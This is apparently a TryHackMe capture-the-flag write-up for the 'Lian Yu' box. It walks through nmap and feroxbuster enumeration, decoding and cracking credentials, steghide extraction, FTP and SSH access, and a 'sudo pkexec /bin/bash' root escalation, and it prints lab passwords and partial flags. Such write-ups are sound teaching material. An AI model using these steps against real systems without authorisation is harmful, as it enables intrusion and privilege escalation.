# TryHackMe — Lian Yu

> A boot2root box requiring web enumeration, steganography, file-header repair, hash cracking, and a `pkexec` privilege escalation to reach root.

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-55a630?style=flat-square&labelColor=555555)
![Focus](https://img.shields.io/badge/Focus-Privilege%20Escalation-orange?style=flat-square)
![Status](https://img.shields.io/badge/Status-Completed-success?style=flat-square)

---

## 🗺️ Attack Path Summary

```
Nmap scan (21, 22, 80, 111)
        │
        ▼
Feroxbuster on / → /island
        │
        ▼
Hidden code word in HTML source → "vigilante"
        │
        ▼
Feroxbuster on /island → /island/2100
        │
        ▼
HTML comment hints at a .ticket file
        │
        ▼
Feroxbuster -x ticket → green_arrow.ticket
        │
        ▼
Base58-decode ticket → FTP password "!#th3h00d"
        │
        ▼
FTP login (vigilante / !#th3h00d) → download 3 files
        │
        ▼
Fix corrupted PNG header (hex edit) → reveals "password" hint
        │
        ▼
steghide extract aa.jpg (passphrase: password) → ss.zip
        │
        ▼
Crack hash in "shado" → "M3tahuman"
        │
        ▼
FTP → discover usernames "slade" and "vigilante"
        │
        ▼
SSH as slade / M3tahuman → USER FLAG
        │
        ▼
sudo -l → pkexec allowed as root
        │
        ▼
sudo pkexec /bin/bash → ROOT FLAG
```

---

## 1. Reconnaissance — Nmap Scan

Started with a version/service scan against the target.

```bash
nmap -sV -sC 10.48.178.59
```

<img width="750" height="515" alt="1" src="https://github.com/user-attachments/assets/27147a55-ace7-4aeb-910c-a3bd6043e6ea" />

**Results:**

|   Port  | Service |            Version            |
|---------|---------|-------------------------------|
| 21/tcp  |   ftp   |         vsftpd 3.0.2          |
| 22/tcp  |   ssh   | OpenSSH 6.7p1 Debian 5+deb8u8 |
| 80/tcp  |  http   |         Apache httpd          |
| 111/tcp | rpcbind |     2–4 (RPC #100000)         |

Four open ports: a web server to enumerate, FTP that may allow anonymous or credentialed access, SSH for later remote access, and RPC bind info.

---

## 2. Web Enumeration — Root Directory

Ran a content discovery scan against the webroot.

```bash
feroxbuster -u http://10.48.178.59 -w /usr/share/wordlists/dirb/big.txt
```

<img width="1128" height="483" alt="2" src="https://github.com/user-attachments/assets/abb7e328-70e9-468a-9c0e-4121b44efe43" />

This surfaced a `/island` directory (`301` redirect to `/island/`).

### Landing page

<img width="1251" height="617" alt="3" src="https://github.com/user-attachments/assets/d802a484-d042-42b6-8270-0497a5027ad0" />

The index page is an Arrowverse-themed splash page with lore about Oliver Queen / Lian Yu — flavor text only, no direct clues.

### `/island`

Browsing to `/island/` shows a short message hinting that a **code word** is needed, and prompts not to "talk." Opening the browser's **Inspector** reveals the code word hidden in the page source as white-on-white text:

```html
<h2 style="color:white">vigilante</h2>
```

<img width="1219" height="382" alt="4" src="https://github.com/user-attachments/assets/ff3e9315-1e0f-414c-8ec3-4ae41efba6e4" />

**Code word found:** `vigilante`

---

## 3. Web Enumeration — `/island` Directory

Fuzzed again, this time scoped to `/island`, with a larger wordlist.

```bash
feroxbuster -u http://10.48.178.59/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<img width="1098" height="463" alt="5" src="https://github.com/user-attachments/assets/6573040c-337d-443e-8b3d-26d8515bc642" />

This found `/island/2100/`.

### `/island/2100/`

<img width="1177" height="362" alt="6" src="https://github.com/user-attachments/assets/9f8e1cbe-25cb-4170-adf5-e0f19399f8a3" />

The page embeds a YouTube video and hides another clue in an HTML comment:

```html
<!--you can avail your .ticket here but how?-->
```

This hints that a file with a **`.ticket`** extension exists somewhere under this path.

---

## 4. Finding the Ticket File

Re-ran feroxbuster against `/island/2100`, this time extending it to look for `.ticket` files:

```bash
feroxbuster -u http://10.48.178.59/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x ticket
```

<img width="1117" height="467" alt="7" src="https://github.com/user-attachments/assets/e363c9da-29b8-4309-b404-1045a12f26e9" />

This located: `http://10.48.178.59/island/2100/green_arrow.ticket`

### Reading the ticket

<img width="830" height="180" alt="8" src="https://github.com/user-attachments/assets/4497d741-24c6-4b03-9e40-2e0e6fd0fb05" />

```
This is just a token to get into Queen's Gambit(Ship)

RTy8yhBQdscX
```

The token looks Base58-encoded (no `0`, `O`, `I`, or `l` characters, which matches Base58's alphabet).

### Decoding the token

```bash
echo 'RTy8yhBQdscX' | base58 --decode
```

<img width="357" height="73" alt="9" src="https://github.com/user-attachments/assets/ddac3d8e-fa0d-40e7-bc17-b6e32614558c" />

**Decoded value:** `!#th3h00d`

This looks like a password (stylized as "The Hood," Oliver Queen's early alias).

---

## 5. FTP Access

With a **username** (`vigilante`, the code word from the `/island` page) and a **password** (`!#th3h00d`, the decoded ticket), logged into FTP:

```bash
ftp 10.48.178.59
```

<img width="331" height="191" alt="10" src="https://github.com/user-attachments/assets/1e0c2760-cab0-45b4-9849-4771a033b450" />

```
Name: vigilante
Password: !#th3h00d
230 Login successful.
```

### Listing and downloading files

```
ftp> ls
Leave_me_alone.png
Queen's_Gambit.png
aa.jpg

ftp> get Leave_me_alone.png
ftp> get Queen's_Gambit.png
ftp> get aa.jpg
```

<img width="607" height="457" alt="11" src="https://github.com/user-attachments/assets/a0c4a518-238c-4ab2-9d5d-f46cdd45fd4a" />

Three files retrieved to the attacking machine for offline analysis.

---

## 6. Repairing a Corrupted PNG

Opening `Leave_me_alone.png` failed to render — a sign the file header was tampered with. Inspecting it in a hex editor confirmed the **PNG magic bytes** were wrong:

<img width="616" height="115" alt="12-1" src="https://github.com/user-attachments/assets/67f207aa-0991-403a-ba7d-bab2ea090485" />

A valid PNG must start with the signature `89 50 4E 47 0D 0A 1A 0A`. The file instead began with `58 45 4F AE 0A 0D 1A 0A`. Patched the first bytes back to the correct PNG signature:

<img width="334" height="75" alt="12-2" src="https://github.com/user-attachments/assets/fe7546fb-180e-4c31-98cf-58a234ae0a26" />

### Verifying the fix

```bash
exiftool Leave_me_alone.png
```

<img width="494" height="367" alt="12-3" src="https://github.com/user-attachments/assets/93fd08c8-a00c-4b44-8e4b-fb8546877a30" />

`File Type: PNG`, `845x475`, `RGB with Alpha` — the repair worked and the file is now a valid, openable image.

### Viewing the repaired image

<img width="836" height="206" alt="12-4" src="https://github.com/user-attachments/assets/ba4a7d5f-6498-445f-8190-1b0bd5c3b64a" />

The image shows a hint reading **"Just leave me alone, here take it what you want — password"** — signaling that the next step needs a *steganography passphrase*, and strongly hinting that the passphrase itself is the word **`password`**.

---

## 7. Steganography on `aa.jpg`

With the hint in hand, extracted hidden data from `aa.jpg` using `steghide`:

```bash
steghide extract -sf aa.jpg -xf ss.zip
```

<img width="661" height="513" alt="13" src="https://github.com/user-attachments/assets/57900cec-5c03-4880-8f9d-f9da332ad80f" />

Unzipping the result:

```bash
unzip ss.zip
```

```
inflating: passwd.txt
inflating: shado
```

```bash
cat passwd.txt
```

```
This is your visa to Land on Lian_Yu # Just for Fun ***

a small Note about it

Having spent years on the island, Oliver learned how to be resourceful
and set booby traps all over the island in the common event he ran
into dangerous people. The island is also home to many animals,
including pheasants, wild pigs and wolves.
```

```bash
cat shado
```

A password hash was contained in `shado`. Cracking it offline (e.g. with `john`/`hashcat` against `rockyou.txt`) recovered the plaintext credential:

**Cracked password:** `M3tahuman`

---

## 8. FTP — Finding Valid Usernames

Went back into the FTP session and moved up a directory to look for user folders:

```
ftp> cd ..
ftp> ls
```

<img width="558" height="130" alt="14" src="https://github.com/user-attachments/assets/2bbf38ef-f209-4204-967b-c3d0e2fd0b1d" />

```
drwx------  2 1000 1000  slade
drwxr-xr-x  2 1001 1001  vigilante
```

Two system usernames discovered: **`slade`** and **`vigilante`**. Combined with the cracked password `M3tahuman`, this gives a credential pair to try over SSH.

---

## 9. SSH Access

```bash
ssh slade@10.48.178.59
```

Password: `M3tahuman`

<img width="691" height="514" alt="15" src="https://github.com/user-attachments/assets/29da75b0-65a2-4c01-beba-5271c1b8e57a" />

Login succeeded, greeted with a "Welcome 2 Lian Yu" ASCII banner, confirming a foothold as the `slade` user.

### Capturing the user flag

```bash
slade@LianYu:~$ ls
user.txt
slade@LianYu:~$ cat user.txt
```

<img width="347" height="91" alt="16" src="https://github.com/user-attachments/assets/7f14e892-024d-4243-86a5-8fd358ae4b90" />

> `THM{P3OP7E_K33P_53CRET5__...REDACTED...}`

---

## 10. Privilege Escalation — `pkexec`

Checked sudo privileges for the current user:

```bash
sudo -l
```

<img width="849" height="146" alt="17" src="https://github.com/user-attachments/assets/53375cd4-8277-4195-b124-1e22aad4ff9f" />

```
User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

`slade` is permitted to run `pkexec` as root. Since `pkexec` can be pointed at any binary (e.g. a shell), this is a direct path to a root shell:

```bash
sudo /usr/bin/pkexec /bin/bash
```

<img width="404" height="60" alt="18" src="https://github.com/user-attachments/assets/9c97614d-e713-407f-841b-ff0673f03d33" />

```
root@LianYu:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Root access achieved.

### Capturing the root flag

```bash
root@LianYu:~# cd /root
root@LianYu:~# ls
root.txt
root@LianYu:~# cat root.txt
```

<img width="800" height="292" alt="19" src="https://github.com/user-attachments/assets/e71d1326-7494-4e35-94c1-04c74c5f5086" />

```
Mission accomplished
You are injected me with Mirakuru :) --> Now slade will become DEATHSTROKE.
```

> `THM{MY_W0RD_I5_MY_B0ND_...REDACTED...}`
